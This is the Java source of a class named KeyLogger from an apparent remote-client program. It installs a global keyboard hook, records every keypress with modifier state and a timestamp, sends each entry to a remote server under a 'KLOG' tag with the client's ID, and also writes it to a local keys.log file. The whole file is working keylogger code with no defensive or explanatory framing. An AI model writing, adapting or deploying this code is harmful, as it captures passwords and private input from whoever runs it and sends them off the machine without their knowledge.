package client;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;

import de.ksquared.system.keyboard.*;
import tools.Connection;

public class KeyLogger extends Thread {

	private static final SimpleDateFormat SDF =
			new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
	
	private static final String LOG_FILE = "keys.log";
	
	private static final GlobalKeyListener globalKeyListener;
	private static final KeyListener listener;
	
	static {
		globalKeyListener = new GlobalKeyListener();
		
		listener = new KeyListener() {

			@Override
			public void keyPressed(KeyEvent arg0) {
				log(arg0.getVirtualKeyCode() + "\t" + arg0.isShiftPressed()
					+ "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());
			}

			@Override
			public void keyReleased(KeyEvent arg0) {}
			
		};
	}
	
	private static Client client;
	
	public KeyLogger(Client client) {
		KeyLogger.client = client;
	}
	
	@Override
	public void run(){
						
		globalKeyListener.addKeyListener(listener);
		
		while (client.doLogKeyboard()) {
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {}
		}
		
		globalKeyListener.removeKeyListener(listener);
		
	}
	
	private static void log(String event) {
		
		String timestamp = SDF.format(
				new Timestamp(System.currentTimeMillis()));
		String line = timestamp + "\t" + event;
		try {
			new Connection()
				  .write("KLOG " + client.getClientId(), line.getBytes());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		append(line);
	}
	
	private static void append(String event) {
		try {
			PrintWriter out = new PrintWriter(new FileWriter(LOG_FILE, true));
			out.println(event);
			out.close();
			
		} catch (IOException e) {}
	}

}
